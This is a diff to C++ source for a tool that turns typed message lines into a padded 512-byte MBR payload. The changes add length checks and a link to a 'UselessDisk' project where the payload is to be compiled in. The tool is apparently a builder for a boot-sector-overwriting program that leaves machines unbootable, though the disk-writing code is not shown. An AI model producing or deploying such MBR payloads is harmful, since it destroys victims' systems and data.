@@ -136,7 +136,7 @@ int main(int argc, char** argv, char** envp){
     TITLE.insert(TITLE.end(), 2, '\x0a');
 
     // NOW WE NEED TO GET OUR USER MESSAGE AND SPLIT THIS MESSAGE PROPERLY.
-    // WE NEED TO READ 8 LINES SO WE ARE LOOPING 10 TIMES
+    // WE NEED TO READ 5 LINES SO WE ARE LOOPING 5 TIMES
     for(int i = 0; i < 5; i++){
         std::cout << "[+] Please enter the " << i+1 << "th message line (80 characters maximum)" << (i > 0 ? "(type 'END' to stop reading)" : "") << (i > 0 ? "(type 'EMPTY' for a empty line)" : "") << std::endl;
         std::cout << ">> ";
@@ -203,22 +203,44 @@ emptyskip:
 
 
     // ADD \x00 PADDING AT THE END OF OUR STRING
-    PAYLOAD.insert(PAYLOAD.end(), 510 - (PAYLOAD.length() + 25), '\x00');
-    assert(PAYLOAD.length() + 25 == 510); // MAKE SURE OUR PAYLOAD IS LESS THAN 512 bytes. (MINUS 2 BYTES FOR THE LAST 2 BYTES OF THE MBR)
+    if(PAYLOAD.length() + 25 > 510){
+        #if defined(_WIN32)
+            ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_RED);
+        #endif
+        std::cout << fmt::format("[+] Payload is longer than 510 bytes (current : {0}), shrinking the payload {1} times", PAYLOAD.length() + 25, (PAYLOAD.length() + 25) - 510)  << std::endl;
+        #if defined(_WIN32)
+            ResetConsoleFontColor(CONSOLE_HANDLE);
+        #endif
+        while(PAYLOAD.length() + 25 > 510){
+            PAYLOAD.pop_back();
+        }
 
+    }
+
+    PAYLOAD.insert(PAYLOAD.end(), 510 - (PAYLOAD.length() + 25), '\x00');
+    
     //ADD THE LAST BYTES TO OUR PAYLOAD
     PAYLOAD += PAYLOAD_END;
-    
-    assert(PAYLOAD.length() + 25 == 512);
+    if(PAYLOAD.length() + 25 != 512){
+        #if defined(_WIN32)
+            ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_RED);
+        #endif
 
+        std::cout << fmt::format("[!] Payload is too long ! (Length : {0}) (MAX LENGTH : 512)", PAYLOAD.length()) << std::endl;
+        std::cout << fmt::format("[+] Please remove {} characters from the message and try again.", PAYLOAD.length() - 512) << std::endl;
+
+        #if defined(_WIN32)
+            ResetConsoleFontColor(CONSOLE_HANDLE);
+        #endif
+    }
     // OUTPUT THE PAYLOAD GENERATED
-    std::cout << "[+] Payload Generated : " << std::endl;
 
     #if defined(_WIN32)
         ChangeConsoleFontColor(CONSOLE_HANDLE, FOREGROUND_GREEN);
     #endif
 
     //OUTPUT THE BEGINNING OF THE PAYLOAD
+    std::cout << "[+] Payload Generated : ";
     std::cout << PAYLOAD_BEGIN_RAW; 
 
     std::for_each(PAYLOAD.begin(), PAYLOAD.end(), [](unsigned char CURRENT_CHARACTER){
@@ -233,7 +255,7 @@ emptyskip:
         ResetConsoleFontColor(CONSOLE_HANDLE);
     #endif
 
-    std::cout << std::endl << std::endl << "[?] What to do next ? Put the generated payload inside the following project (link to project) before compiling it." << std::endl;
+    std::cout << std::endl << std::endl << "[?] What to do next ? Put the generated payload inside the following project (https://github.com/memzer0x/UselessDisk) before compiling it." << std::endl;
 
     return 0;
 } 
